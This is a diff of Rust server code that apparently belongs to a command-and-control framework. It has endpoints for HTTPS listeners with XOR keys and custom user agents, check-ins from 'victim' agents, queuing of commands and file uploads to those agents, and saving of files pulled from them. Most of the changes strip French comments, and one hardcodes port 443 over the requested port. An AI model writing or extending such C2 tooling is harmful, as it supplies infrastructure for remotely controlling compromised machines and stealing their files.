@@ -390,11 +390,9 @@ async fn add_listener(
     let headers_json = serde_json::to_string(&body.headers).unwrap();
 
     if body.listener_type == "https" {
-        // ===== HTTPS Listener =====
         let (tls_cert, tls_key, tls_cert_chain, cert_auto_generated) = if body.tls_cert.is_empty()
             || body.tls_key.is_empty()
         {
-            // Auto-generate self-signed certificate
             log::info!(
                 "[*] No certificate provided, generating self-signed certificate for '{}'",
                 body.listener_name
@@ -407,7 +405,6 @@ async fn add_listener(
                         "[+] Self-signed certificate generated for listener '{}'",
                         body.listener_name
                     );
-                    // For self-signed, cert_chain is the same as cert
                     (
                         generated.cert_pem.clone(),
                         generated.key_pem,
@@ -424,7 +421,6 @@ async fn add_listener(
                 }
             }
         } else {
-            // Use provided certificates
             let cert_chain = if body.tls_cert_chain.is_empty() {
                 body.tls_cert.clone()
             } else {
@@ -437,12 +433,12 @@ async fn add_listener(
                 false,
             )
         };
-
+        let port = 443;
         if let Err(e) = state.database.add_listener_https(
             &body.listener_name,
             &body.listener_type,
             &body.listener_ip,
-            body.listener_port,
+            port,
             &body.xor_key,
             &body.user_agent,
             &body.uri_paths,
@@ -468,7 +464,7 @@ async fn add_listener(
             "[+] HTTPS listener '{}' added on {}:{}{}",
             body.listener_name,
             body.listener_ip,
-            body.listener_port,
+            port,
             cert_info
         );
 
@@ -545,7 +541,6 @@ async fn agent_checkin(state: Data<AppState>, payload: Json<VictimCheckinInfo>) 
         agent_info.process_name = Some(payload.process_name.clone());
         agent_info.last_seen = AgentHandler::get_current_timestamp();
 
-        // ========== CORRECTION: Passer le paramètre database ==========
         state
             .agent_handler
             .update_agent(&payload.agent_id, agent_info, Some(&state.database));
@@ -568,14 +563,12 @@ async fn agent_checkin(state: Data<AppState>, payload: Json<VictimCheckinInfo>) 
                 payload.agent_id
             );
 
-            // Marquer les commandes comme envoyées
             for (cmd_id, _) in &cmds {
                 if let Err(e) = state.database.mark_command_sent(*cmd_id) {
                     log::warn!("[!] Failed to mark command {} as sent: {}", cmd_id, e);
                 }
             }
 
-            // Extraire seulement les commandes (pas les IDs)
             cmds.into_iter().map(|(_, cmd)| cmd).collect()
         }
         Err(e) => {
@@ -714,7 +707,6 @@ async fn download_result_file(
         }
     };
 
-    // ✅ FIX: BLOQUER LES CONFIRMATIONS D'UPLOAD
     let result_type = result.r#types.as_deref().unwrap_or("text");
 
     if result_type == "upload_file" {
@@ -724,7 +716,6 @@ async fn download_result_file(
         });
     }
 
-    // ✅ Maintenant, vérifier que c'est un fichier téléchargeable
     if result_type != "file" {
         return HttpResponse::BadRequest().json(ApiResponse {
             success: false,
@@ -755,7 +746,6 @@ async fn download_result_file(
         format!("download_{}.bin", result_id_value)
     };
 
-    // ===== Décoder le contenu base64 =====
     let file_data = match STANDARD.decode(&result.output) {
         Ok(data) => data,
         Err(e) => {
@@ -771,7 +761,6 @@ async fn download_result_file(
         }
     };
 
-    // ===== Enregistrement automatique dans downloads/ =====
     let save_dir = "downloads";
     let save_path = format!("{}/{}", save_dir, filename);
 
@@ -796,7 +785,6 @@ async fn download_result_file(
         }
     }
 
-    // ===== Réponse normale si l'enregistrement échoue =====
     HttpResponse::Ok()
         .content_type("application/octet-stream")
         .insert_header(ContentDisposition {
@@ -829,7 +817,6 @@ async fn upload_files(
         body.content.len()
     );
 
-    // ===== VÉRIFIER L'AGENT =====
     match state.agent_handler.get_agent(&body.agent_id) {
         Some(_) => log::debug!("[+] Agent {} found", body.agent_id),
         None => {
@@ -841,7 +828,6 @@ async fn upload_files(
         }
     }
 
-    // ===== VALIDER LE BASE64 =====
     if let Err(e) = STANDARD.decode(&body.content) {
         log::error!("[!] Invalid base64 content: {}", e);
         return HttpResponse::BadRequest().json(ApiResponse {
@@ -850,13 +836,10 @@ async fn upload_files(
         });
     }
 
-    // ===== FORMATER LA COMMANDE AVEC CommandFormatter =====
-    // Créer un fichier temporaire pour que CommandFormatter puisse le lire
     let temp_dir = "temp_uploads";
     std::fs::create_dir_all(temp_dir).ok();
     let temp_path = format!("{}/{}", temp_dir, body.filename);
 
-    // Décoder et écrire le fichier temporaire
     let file_bytes = STANDARD
         .decode(&body.content)
         .map_err(|e| {
@@ -876,7 +859,6 @@ async fn upload_files(
         });
     }
 
-    // ✅ UTILISER CommandFormatter pour générer la commande
     let upload_command = match CommandFormatter::format_command(&format!("/upload {}", temp_path)) {
         Ok(cmd) => {
             log::info!("[+] Upload command formatted: {}", cmd);
@@ -892,10 +874,8 @@ async fn upload_files(
         }
     };
 
-    // Nettoyer le fichier temporaire
     std::fs::remove_file(&temp_path).ok();
 
-    // ===== CRÉER LA COMMANDE =====
     let command_id = match state.database.add_command(&body.agent_id, &upload_command) {
         Ok(id) => {
             log::info!(
@@ -914,10 +894,6 @@ async fn upload_files(
         }
     };
 
-    // ===== PAS BESOIN DE STOCKER LE RÉSULTAT ICI =====
-    // Le résultat sera stocké quand l'agent confirmera l'upload
-
-    // ===== LOGGER L'ACTION =====
     if let Err(e) = state.database.log_agent_action(
         &body.agent_id,
         "upload_queued",
@@ -985,7 +961,6 @@ async fn view_result_file(
         });
     }
 
-    // Décoder le Base64
     let file_data = match STANDARD.decode(&result.output) {
         Ok(data) => data,
         Err(e) => {
@@ -997,11 +972,9 @@ async fn view_result_file(
         }
     };
 
-    // Convertir en texte (si possible)
     let content = match String::from_utf8(file_data.clone()) {
         Ok(text) => text,
         Err(_) => {
-            // Si ce n'est pas du texte UTF-8, renvoyer un message
             return HttpResponse::Ok().json(serde_json::json!({
                 "result_id": result_id_value,
                 "filename": result.filename,
@@ -1012,7 +985,6 @@ async fn view_result_file(
         }
     };
 
-    // Renvoyer le contenu décodé
     HttpResponse::Ok().json(serde_json::json!({
         "result_id": result_id_value,
         "filename": result.filename,
